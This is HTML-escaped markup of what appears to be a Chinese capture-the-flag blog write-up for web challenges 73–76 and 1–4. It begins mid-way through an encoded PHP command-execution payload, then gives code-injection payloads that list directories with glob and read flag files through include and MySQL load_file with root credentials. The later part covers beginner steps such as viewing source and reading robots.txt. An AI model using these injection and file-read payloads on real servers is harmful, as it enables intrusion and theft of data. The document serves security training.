ss=&#34;title&#34;&gt;abc&lt;/span&gt;%2&lt;span class=&#34;title&#34;&gt;c&lt;/span&gt;+0&lt;span class=&#34;title&#34;&gt;xd0&lt;/span&gt;+%2&lt;span class=&#34;title&#34;&gt;b&lt;/span&gt;+0&lt;span class=&#34;title&#34;&gt;x68&lt;/span&gt;%2&lt;span class=&#34;title&#34;&gt;c&lt;/span&gt;+%24&lt;span class=&#34;title&#34;&gt;zif_system&lt;/span&gt;)%3&lt;span class=&#34;title&#34;&gt;b&lt;/span&gt;+%23+&lt;span class=&#34;title&#34;&gt;internal&lt;/span&gt;+&lt;span class=&#34;title&#34;&gt;func&lt;/span&gt;+&lt;span class=&#34;title&#34;&gt;handler&lt;/span&gt;%0&lt;span class=&#34;title&#34;&gt;a&lt;/span&gt;%0&lt;span class=&#34;title&#34;&gt;a&lt;/span&gt;++++(%24&lt;span class=&#34;title&#34;&gt;helper&lt;/span&gt;-%3&lt;span class=&#34;title&#34;&gt;eb&lt;/span&gt;)(%24&lt;span class=&#34;title&#34;&gt;cmd&lt;/span&gt;)%3&lt;span class=&#34;title&#34;&gt;b&lt;/span&gt;%0&lt;span class=&#34;title&#34;&gt;a&lt;/span&gt;++++&lt;span class=&#34;title&#34;&gt;exit&lt;/span&gt;()%3&lt;span class=&#34;title&#34;&gt;b&lt;/span&gt;%0&lt;span class=&#34;title&#34;&gt;a&lt;/span&gt;%7&lt;span class=&#34;title&#34;&gt;d&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h1 id=&#34;Web73：&#34;&gt;&lt;a href=&#34;#Web73：&#34; class=&#34;headerlink&#34; title=&#34;Web73：&#34;&gt;&lt;/a&gt;Web73：&lt;/h1&gt;&lt;p&gt;​		又是，没源码，那就glob遍历文件目录吧，当然var_export也可以做到这里没有被ban：&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;c=&lt;span class=&#34;variable&#34;&gt;$a&lt;/span&gt;=&lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;DirectoryIterator&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;glob:///*&amp;quot;&lt;/span&gt;);&lt;span class=&#34;keyword&#34;&gt;foreach&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$a&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;as&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;$f&lt;/span&gt;)&amp;#123;&lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;$f&lt;/span&gt;.&lt;span class=&#34;string&#34;&gt;&amp;quot;    &amp;quot;&lt;/span&gt; ;&amp;#125;&lt;span class=&#34;keyword&#34;&gt;exit&lt;/span&gt;();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#bin dev etc flagc.txt home lib media mnt opt proc root run sbin srv sys tmp usr var &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;​		突然发现include读取文件又可以了，直接读：&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;c=&lt;span class=&#34;title function_ invoke__&#34;&gt;indlude&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;/flagc.txt&amp;quot;&lt;/span&gt;);&lt;span class=&#34;keyword&#34;&gt;exit&lt;/span&gt;();&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h1 id=&#34;Web74：&#34;&gt;&lt;a href=&#34;#Web74：&#34; class=&#34;headerlink&#34; title=&#34;Web74：&#34;&gt;&lt;/a&gt;Web74：&lt;/h1&gt;&lt;p&gt;​		这一题ban了scandir，那就直接glob绕过：&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;c=&lt;span class=&#34;variable&#34;&gt;$a&lt;/span&gt;=&lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;DirectoryIterator&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;glob:///*&amp;quot;&lt;/span&gt;);&lt;span class=&#34;keyword&#34;&gt;foreach&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$a&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;as&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;$f&lt;/span&gt;)&amp;#123;&lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;$f&lt;/span&gt;.&lt;span class=&#34;string&#34;&gt;&amp;quot;    &amp;quot;&lt;/span&gt; ;&amp;#125;&lt;span class=&#34;keyword&#34;&gt;exit&lt;/span&gt;();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#bin dev etc flagx.txt home lib media mnt opt proc root run sbin srv sys tmp usr var &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;​		之后include去读。&lt;/p&gt;
&lt;h1 id=&#34;Web75：&#34;&gt;&lt;a href=&#34;#Web75：&#34; class=&#34;headerlink&#34; title=&#34;Web75：&#34;&gt;&lt;/a&gt;Web75：&lt;/h1&gt;&lt;p&gt;​		glob读根目录结构：&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;c=&lt;span class=&#34;variable&#34;&gt;$a&lt;/span&gt;=&lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;DirectoryIterator&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;glob:///*&amp;quot;&lt;/span&gt;);&lt;span class=&#34;keyword&#34;&gt;foreach&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$a&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;as&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;$f&lt;/span&gt;)&amp;#123;&lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;$f&lt;/span&gt;.&lt;span class=&#34;string&#34;&gt;&amp;quot;    &amp;quot;&lt;/span&gt; ;&amp;#125;&lt;span class=&#34;keyword&#34;&gt;exit&lt;/span&gt;();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#bin dev etc flag36.txt home lib media mnt opt proc root run sbin srv sys tmp usr var &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;​		多次测试，发现无法读取文件，可以试着利用mysql去读取文件：&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;c=&lt;span class=&#34;keyword&#34;&gt;try&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;variable&#34;&gt;$dbh&lt;/span&gt; = &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;title function_ invoke__&#34;&gt;PDO&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;mysql:host=localhost;dbname=information_schema&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;root&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;root&amp;#x27;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;foreach&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$dbh&lt;/span&gt;-&amp;gt;&lt;span class=&#34;title function_ invoke__&#34;&gt;query&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;select load_file(&amp;quot;/flag36.txt&amp;quot;)&amp;#x27;&lt;/span&gt;) &lt;span class=&#34;keyword&#34;&gt;as&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;$row&lt;/span&gt;) &amp;#123;  &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$row&lt;/span&gt;[&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;]).&lt;span class=&#34;string&#34;&gt;&amp;quot;|&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;variable&#34;&gt;$dbh&lt;/span&gt; = &lt;span class=&#34;literal&#34;&gt;null&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125; &lt;span class=&#34;keyword&#34;&gt;catch&lt;/span&gt; (PDOException &lt;span class=&#34;variable&#34;&gt;$e&lt;/span&gt;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;$e&lt;/span&gt;-&amp;gt;&lt;span class=&#34;title function_ invoke__&#34;&gt;getMessage&lt;/span&gt;();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;die&lt;/span&gt;();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;;&lt;span class=&#34;keyword&#34;&gt;exit&lt;/span&gt;();&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;​		简单解释一下这个payload：&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;try&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;// 使用PDO（PHP Data Objects）创建一个新的数据库连接对象，指定DSN、用户名（root）和密码（root）&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;variable&#34;&gt;$dbh&lt;/span&gt; = &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;title function_ invoke__&#34;&gt;PDO&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;mysql:host=localhost;dbname=information_schema&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;root&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;root&amp;#x27;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;// 执行一个SQL查询，从指定的文件（/flag36.txt）中读取内容&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;foreach&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$dbh&lt;/span&gt;-&amp;gt;&lt;span class=&#34;title function_ invoke__&#34;&gt;query&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;select load_file(&amp;quot;/flag36.txt&amp;quot;)&amp;#x27;&lt;/span&gt;) &lt;span class=&#34;keyword&#34;&gt;as&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;$row&lt;/span&gt;) &amp;#123;  &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;comment&#34;&gt;// 输出读取到的内容，并追加一个竖线（|）&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$row&lt;/span&gt;[&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;]).&lt;span class=&#34;string&#34;&gt;&amp;quot;|&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;// 将数据库连接对象设置为null，关闭连接&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;variable&#34;&gt;$dbh&lt;/span&gt; = &lt;span class=&#34;literal&#34;&gt;null&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125; &lt;span class=&#34;keyword&#34;&gt;catch&lt;/span&gt; (PDOException &lt;span class=&#34;variable&#34;&gt;$e&lt;/span&gt;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;// 如果发生PDO异常，输出错误信息&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;$e&lt;/span&gt;-&amp;gt;&lt;span class=&#34;title function_ invoke__&#34;&gt;getMessage&lt;/span&gt;();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;// 终止脚本执行&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;die&lt;/span&gt;();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;// 终止脚本执行&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;exit&lt;/span&gt;();&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h1 id=&#34;Web76：&#34;&gt;&lt;a href=&#34;#Web76：&#34; class=&#34;headerlink&#34; title=&#34;Web76：&#34;&gt;&lt;/a&gt;Web76：&lt;/h1&gt;&lt;p&gt;​		还是glob读文件：&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;c=&lt;span class=&#34;variable&#34;&gt;$a&lt;/span&gt;=&lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;DirectoryIterator&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;glob:///*&amp;quot;&lt;/span&gt;);&lt;span class=&#34;keyword&#34;&gt;foreach&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$a&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;as&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;$f&lt;/span&gt;)&amp;#123;&lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;$f&lt;/span&gt;.&lt;span class=&#34;string&#34;&gt;&amp;quot;    &amp;quot;&lt;/span&gt; ;&amp;#125;&lt;span class=&#34;keyword&#34;&gt;exit&lt;/span&gt;();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#bin dev etc flag36d.txt home lib media mnt opt proc root run sbin srv sys tmp usr var &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;​		还是老样子，MySQL读文件一把梭：&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;c=&lt;span class=&#34;keyword&#34;&gt;try&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;variable&#34;&gt;$dbh&lt;/span&gt; = &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;title function_ invoke__&#34;&gt;PDO&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;mysql:host=localhost;dbname=information_schema&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;root&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;root&amp;#x27;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;foreach&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$dbh&lt;/span&gt;-&amp;gt;&lt;span class=&#34;title function_ invoke__&#34;&gt;query&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;select load_file(&amp;quot;/flag36d.txt&amp;quot;)&amp;#x27;&lt;/span&gt;) &lt;span class=&#34;keyword&#34;&gt;as&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;$row&lt;/span&gt;) &amp;#123;  &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$row&lt;/span&gt;[&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;]).&lt;span class=&#34;string&#34;&gt;&amp;quot;|&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;variable&#34;&gt;$dbh&lt;/span&gt; = &lt;span class=&#34;literal&#34;&gt;null&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125; &lt;span class=&#34;keyword&#34;&gt;catch&lt;/span&gt; (PDOException &lt;span class=&#34;variable&#34;&gt;$e&lt;/span&gt;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;$e&lt;/span&gt;-&amp;gt;&lt;span class=&#34;title function_ invoke__&#34;&gt;getMessage&lt;/span&gt;();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;die&lt;/span&gt;();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;;&lt;span class=&#34;keyword&#34;&gt;exit&lt;/span&gt;();&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;






















&lt;h1 id=&#34;一些总结文章：&#34;&gt;&lt;a href=&#34;#一些总结文章：&#34; class=&#34;headerlink&#34; title=&#34;一些总结文章：&#34;&gt;&lt;/a&gt;一些总结文章：&lt;/h1&gt;&lt;p&gt;&lt;a href=&#34;https://blog.csdn.net/qq_41315957/article/details/118855865?ops_request_misc=&amp;request_id=&amp;biz_id=102&amp;utm_term=linux%E5%8F%96%E5%8F%8D%E5%91%BD%E4%BB%A4rce%E8%84%9A%E6%9C%AC&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-1-118855865.142%5Ev100%5Epc_search_result_base6&amp;spm=1018.2226.3001.4187&#34;&gt;总结rce（远程代码执行各种sao姿势）绕过bypass&lt;/a&gt;&lt;/p&gt;

 &lt;h1 id=&#34;Web1：&#34;&gt;&lt;a href=&#34;#Web1：&#34; class=&#34;headerlink&#34; title=&#34;Web1：&#34;&gt;&lt;/a&gt;Web1：&lt;/h1&gt;&lt;p&gt;​		题目描述：开发注释未及时删除 。&lt;/p&gt;
&lt;p&gt;​		打开题目后提示web1:where is flag?&lt;/p&gt;
&lt;p&gt;​		ctrl+u读取源码。&lt;/p&gt;
&lt;h1 id=&#34;Web2：&#34;&gt;&lt;a href=&#34;#Web2：&#34; class=&#34;headerlink&#34; title=&#34;Web2：&#34;&gt;&lt;/a&gt;Web2：&lt;/h1&gt;&lt;p&gt;​		题目描述：js前台拦截 &amp;#x3D;&amp;#x3D;&amp;#x3D; 无效操作&lt;/p&gt;
&lt;p&gt;​		打开题目后显示：无法查看源代码&lt;/p&gt;
&lt;p&gt;​		右键无法用，但是ctrl+u可以用。&lt;/p&gt;
&lt;h1 id=&#34;Web3：&#34;&gt;&lt;a href=&#34;#Web3：&#34; class=&#34;headerlink&#34; title=&#34;Web3：&#34;&gt;&lt;/a&gt;Web3：&lt;/h1&gt;&lt;p&gt;​		提示要抓包，那就抓包，发送到repeater，响应头里发现flag。&lt;/p&gt;
&lt;h1 id=&#34;Web4：&#34;&gt;&lt;a href=&#34;#Web4：&#34; class=&#34;headerlink&#34; title=&#34;Web4：&#34;&gt;&lt;/a&gt;Web4：&lt;/h1&gt;&lt;p&gt;​		题目描述：总有人把后台地址写入robots，帮黑阔大佬们引路。&lt;/p&gt;
&lt;p&gt;​		基础知识：Robots协议（也称&lt;a href=&#34;https://so.csdn.net/so/search?q=%E7%88%AC%E8%99%AB&amp;spm=1001.2101.3001.7020&#34;&gt;爬虫&lt;/a&gt;协议，机器人协议等）的全称是“网络爬虫排除协议”，网站通过Robots协议告诉搜索引擎哪些页面可以抓取，哪些页面不能抓取。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Robots参数：&lt;/p&gt;
&lt;p&gt;User-agent：&lt;/p&gt;
&lt;p&gt;作用：用于描述搜索引擎蜘蛛的名字；&lt;/p&gt;
&lt;p&gt;技巧：&lt;/p&gt;
&lt;p&gt;1，当robots.txt不为空的时候，必须至少有一条user-agent的记录；&lt;/p&gt;
&lt;p&gt;2，相同名字，只能有一条，但是不同的蜘蛛，可以有多条记录；&lt;/p&gt;
&lt;p&gt;Disallow：&lt;/p&gt;
&lt;p&gt;作用：用于描述不允许搜索引擎蜘蛛爬行和抓取的url；&lt;/p&gt;
&lt;p&gt;使用技巧：&lt;/p&gt;
